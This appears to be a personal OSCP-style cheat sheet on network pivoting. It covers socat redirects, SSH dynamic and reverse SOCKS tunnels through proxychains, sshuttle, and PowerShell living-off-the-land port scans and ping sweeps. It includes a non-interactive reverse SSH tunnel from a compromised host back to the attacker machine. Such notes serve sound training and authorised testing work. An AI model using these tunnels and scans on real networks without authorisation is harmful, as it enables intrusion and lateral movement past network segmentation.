<% tp.file.rename("4_Pivoting_A-B")%>
# Port Redirect

\[Subnets\]                         WAN          |     Subnet  1     |      Subnet 2     |      Subnet 3
\[Hosts\]               Kali    --->   Machine A ---> Machine B ---> Machine C
\-
\[Simple\]                                        Socat                  Target
\[Local\]                                      SSH Client           SSH Server             Target
\[Remote\]     SSH Server          SSH Client              Target



### Simple static

```bash
socat -ddd TCP-LISTEN:2345,fork TCP:$hip:$hport
```
(Machine A)

Alternative with netcat: https://gist.github.com/holly/6d52dd9addd3e58b2fd5
Alternative requiring root rights: iptables


### Local Dynamic

```powershell
ssh -N -D 0.0.0.0:9999 $user_B@$ip_B
```
(Machine A)

### Remote Dynamic with ProxyChains and SSH
##### 1st Setup (kali machine)
SSH
```
ssh-keygen -t rsa -b 4096 -f ./id_rsa_kali
cat ./id_rsa_kali.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
ProxyChains
```bash
nano /etc/proxychains4.conf
```
> With it, tools that do not support socks proxys by default, can be made compatible with the tunnel IF they are (most) dynamically-linked binaries.
> For local redirects add `socks5 $hip 9999` to the end.
> For remote redirects use `socks5 127.0.0.1 9999`.
> If socks4 is required, UDP and IPv6 won't be supported.
##### Use it
(kali machine)
```bash
sudo systemctl start ssh
```
In use with port scanning, you might lower `tcp_read_time_out` and `tcp_connect_time_out` in `/etc/proxychains4.conf` to dramatically increase scanning speed.

(Machine A, interactive)
```bash
ssh -N -R 9999 kali@$ip_kali
```
or
(Machine A, non-interactive)
Copy the private key `/ftphome/id_rsa_kali` to machine A. Then, run the following on it:
```bash
ssh -f -q -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i id_rsa_kali -N -R 9999 kali@$hip
```

(kali machine)
`proxychains <command>` to start e.g. a nmap scan over the pivot
> Warning: It appears to then not use the IP-Addresses put into `/etc/hosts`

### Remote Dynamic with sshuttle
> Requires python on machine A!

```bash
socat TCP-LISTEN:2222,fork TCP:$ip_B:22
```
(Machine A)

```bash
sshuttle -r $user_A@$ip_A:2222 $subnet_2 $subnet_1
```
(kali machine)



# Windows specific

Enable Telnet
```powershell
dism /online /Enable-Feature /FeatureName:TelnetClient
```

Portscan LOLBAS
```powershell
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("$hip", $_)) "TCP port $_ is open"} 2>$null
```

Pingsweep LOLBAS
```powershell
workflow pingsweep { foreach -parallel ($computer in 1..254) { if (Test-Connection -BufferSize 32 -Count 1 -ComputerName 192.168.209.$computer -Quiet) {echo "192.168.209.$computer"} {echo "nein"} } }; pingsweep
```

```powershell
1..254 | % { if (Test-Connection -BufferSize 32 -Count 1 -ComputerName 192.168.209.$_ -Quiet) {echo "192.168.209.$_"}} 2>$null
```

```powershell
$(foreach ($computer in 1..254) { Start-Job -ScriptBlock { if ( Test-Connection -BufferSize 32 -Count 1 -ComputerName 192.168.209.$using:computer -Quiet ) {echo "192.168.209.$using:computer"} } }) | Receive-Job -Wait
```


For port forwarding techniques using the windows tools ssh.exe, plink, and netsh, consider the oscp manual